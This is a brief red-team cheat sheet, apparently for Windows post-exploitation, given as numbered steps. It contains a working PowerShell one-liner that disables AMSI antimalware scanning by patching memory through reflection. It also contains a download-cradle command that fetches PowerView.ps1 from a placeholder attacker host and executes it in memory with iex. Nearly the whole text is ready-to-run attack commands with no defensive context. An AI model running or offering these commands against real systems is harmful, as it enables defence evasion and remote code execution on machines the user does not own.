
1. Bypass AMSI

```PowerShell
PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

2. Load remotely PowerView.ps1 inside memory (iex).

```PowerShell
PS C:\> (new-object system.net.webclient).downloadstring('http://Attacker:port/PowerView.ps1') | iex
```

3. Execute PowerView normally.